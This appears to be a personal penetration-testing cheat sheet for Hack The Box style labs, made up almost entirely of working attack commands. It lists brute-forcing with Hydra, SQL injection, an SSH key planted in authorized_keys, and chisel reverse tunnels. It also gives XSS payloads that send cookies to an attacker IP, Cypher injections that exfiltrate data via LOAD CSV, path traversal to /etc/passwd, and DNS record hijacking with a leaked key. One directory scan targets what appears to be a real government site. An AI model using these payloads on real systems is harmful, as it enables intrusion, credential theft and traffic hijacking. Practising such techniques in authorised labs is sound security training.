### upgrading shells

https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html

```
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

/bin/sh -i
```
https://www.nickczh.com/upgrading-your-shell/


### gobuster

`gobuster dir --url https://10.129.240.189 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k`

### gobuster dns enumeration

`gobuster dns -d snoopy.htb -w /usr/share/spiderfoot/spiderfoot/dicts/subdomains-10000.txt -r 10.129.188.75 -i`

### dirb

for php pages dirb works best

`dirb http://mailroom.htb`

### dirsearch

`dirsearch -u http://mailroom.htb -t 200`

### fuff subdomain enumeration

`ffuf -w /snap/seclists/25/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.mailroom.htb" -u http://mailroom.htb -fs 7746`

### subdomain enumeration gobuster
`gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain` 

### gobuster status code
go buster status code : `gobuster dir -u https://www.jmicc.gov.pk/ -w /usr/share/wordlists/dirb/common.txt -b '403,404'`

using wget to reveal the text as /root/root

sudo wget --input-file /root/root.txt

https://gtfobins.github.io/


### wpscan

wpscan --url https://brainfuck.htb --disable-tls-checks

### for ciphers

https://rumkin.com/tools/cipher/ for ciphers

### sql injection

`sqlmap -r login.req`

sqlinjection try: `admin'-- -`

### Using Hydra

```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.162.247 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid"
```

```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.162.247 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect"

```

### hacktools extensions

Yuo can use the extension of hacktoools for generating reverse shells

### ansible privilege escalation

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/?ref=nickczh.com

### adding keys

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fQqdcN8qxqB3OH9lCBMyGcAz+c8a5uRxuvif1A98/jv5LLYy/2GO7r68nHOSIviFtkbnydmuTyzBBSWhbxC/MWAX8XZx5C3rF598/phDzwN4seus2SMhZi5zUZ6iylBBI8xht5J+u/InI6BlsXQ65H3xw+yFxndxeKi3Gu17glt3OEe8aAPaxj3qU89L1xbOr4m3mSqnhJne7eV05nqYvZDHP+pgOQE02dmmplRfTHCKbEfwqY/nDx7QWw6WtrQigNlEGNcWJUVKNlXBGoGHZuyHNMpoh4XjinLeM9GKFY4xRxk2CyFBLwlouOtj7s5EtFB5CLnaQMpDtzI+gJyma7nzxJZxELrlTHyjPJoQHQSmlQe+tBNBRAEL92wac79psK7s3PARdCcyEnpe8l9cplPP8YIS8tMg6BVVjTGPQNN0BJBwRxEjrvAKae1phztkQD7tZKy3aEl8VCUR8tpJ0fw0mK6/PJGxgCYXZWWKwycHOnJKQYDL17qsTypaLL8= kali@kali" >> authorized_keys

### Proxychains

proxychains evil-winrm -u matthew -p 147258269 -i 172.16.22.1

trying evil winrm on dc with prooxychains

https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29

sudo ./chisel server -p 8081 --reverse 
- on attacker

./chisel client 10.10.16.24:8081 R:socks
 - on victim

on attacker
sudo nano /etc/proxychains4.conf

`socks5   127.0.0.1   1080`

how to add attacker ot proxychains is what i need to look into

### using chisel through evilwinrm

./chisel client 10.10.16.24:8001 R:5985:172.16.22.1:5985
./chisel server -p 8001 — reverse

.\chisel.exe client 10.10.16.24:9095 R:80localhost:80 R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
./chisel server -p 9095 -reverse

### cross site scripting / XSS

<img src="10.10.16.24:8000/test.jpg" /> <script src="http://10.10.16.24:8000/cookie.js"></script>

```
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.16.24:9001/?test='+document.cookie, true);
request.send()
```

https://github.com/shelld3v/JSshell
for shell


jsh.py -g

<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.16.24:4848/?".concat(document.cookie)},1010)</script>

this will get a shell to extract cookies.

### mysql interaction

```
mysql --host=db --user=root --password=root cacti -e "show table"
```

### DNS zone transfer


https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/

dig command syntaxt snoopy.htb @<snoopy actual ip>
`dig axfr snoopy.htb @10.10.11.212`

### dns mitm

dns mitm is possible if you manafe to get the dns key from

/etc/bind/named.conf

```

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

```
nsupdate -d -y hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=
Creating key...
namefromtext
keycreate
> server snoopy.htb
> update add mail.snoopy.htb 86400 IN A 10.10.16.47
> send
```

python -m smtpd -c DebuggingServer -n 127.0.0.1:25

### LFI vulnerability

GET /download?file=....//....//....//....//etc/passwd HTTP/1.1

### nmap reference hyperbeast

```
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.150.83 -oG allPorts
```

then on specific ports

```
nmap -p22,80 -sCV 10.129.90.230 -oN targeted
```

### targeted nmap

```
nmap -p22,53,80 -sCV 10.129.150.83 -oN targeted
```

### post request with curl

```
 curl --location 'http://10.10.11.224:55555/api/baskets/yesterday' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/login", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
```

you can use the curl traffic to intercept

```
curl --proxy localhost:8080 -s -X POST http://beta.only4you.htb/download -d "image=/etc/nginx/sites-enabled/default"
```

### Neo4j enumeration

```
'OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.47/?label='+label as l RETURN 0 as _0 //
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.47/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

### git

`python3 git-dumper.py http://pilgrimage.htb git-dumps`

### checking for suid binaries

`$ find / -perm -u=s 2>/dev/null`


